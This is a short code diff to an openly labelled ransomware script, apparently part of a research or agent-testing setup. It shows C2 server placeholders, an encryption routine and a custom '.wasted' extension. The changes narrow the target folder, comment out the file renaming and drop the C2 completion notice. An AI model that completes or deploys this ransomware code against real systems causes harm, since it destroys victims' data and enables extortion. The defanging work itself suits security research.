@@ -16,11 +16,12 @@ from globals import get_reset_path, get_terminate_path, get_config_from_file
 # ============ 		GLOBALS 	  ==============
 # ============================================================
 
+USER = "USERNAME_HERE"
 C2_IP = "<C2-Server-IP>"
 C2_PORT = "<C2-Port>"
 C2_RW_ROUTE = "/rw/done"
 
-LINUX_STARTDIRS = [environ['HOME'] + '/FTP']
+LINUX_STARTDIRS = [f'/home/{USER}/FTP/malicious_folder']
 EXTENSION = ".wasted"  # Ransomware custom extension
 ROAR_DIR = "/roar"
 RATE_FILE = "rate.roar"
@@ -410,7 +411,7 @@ def encrypt_files(key, start_dirs):
                         raise e
 
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
-                rename(file, encrypted_name)
+                # rename(file, encrypted_name)
                 # print("File changed from " + file + " to " + encrypted_name)  # keep!
 
                 t_files += 1
@@ -515,8 +516,6 @@ def run(encrypt, absolute_paths=None):
         with open("./" + RATE_FILE, "w+"):  # create file if not exists and truncate contents if exists
             pass
         encrypt_files(key, start_dirs)
-        if not (path.exists(get_reset_path()) or path.exists(get_terminate_path())):
-            notify_rw_done()  # only notify if legitimately done and not terminated by agent
     else:
         decrypt_files(key, start_dirs)
 
